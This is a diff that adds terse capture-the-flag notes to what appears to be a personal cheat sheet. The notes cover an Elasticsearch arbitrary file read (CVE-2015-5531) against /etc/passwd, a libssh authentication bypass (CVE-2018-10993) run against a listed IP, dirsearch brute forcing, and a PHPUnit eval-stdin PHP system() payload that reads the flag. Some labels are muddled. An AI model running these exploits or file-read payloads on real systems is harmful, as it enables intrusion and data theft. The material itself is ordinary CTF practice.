@@ -48,5 +48,26 @@ file:///etc/passwd
 host changed to - company.tld
 file:///home/ctf/app.py
 
+elastic:
+sudo apt install exploitdb
+sudo apt install libxml2-utils
+Search for remote oracle exploits for windows:
+searchsploit elasticsearch
+https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
+The vulnerability present in the current scenario, offers more details about CVE-2015-5531 Arbitrary file Vulnerability
+python exploit_elastic.py link /etc/passwd
+
+libssh:
+nmap -sV -sC -p 31367 34.141.12.127 -Pn
+You can use CVE-2018-10993 libSSH authentication bypass exploit- https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
+python3 libssh.py 34.141.12.127 -p 31367 -c "cd ..;cat flag.txt"
+
+php-unit:
+$./dirsearch.py -u http://34.141.12.127:32017 -w ./db/dicc.txt
+Dirsearch is an advanced command-line tool designed to brute force directories and files in webservers, AKA web path scanner dirsearch is being actively developed by @maurosoria and @shelld3v
+./dirsearch.py -u link -w ./db/dicc.txt
+composer.json -Here we can find version of php-unit
+/eval-stding.php-Vulnerable path
+<?php system('cat /flag.txt')?>
 
 
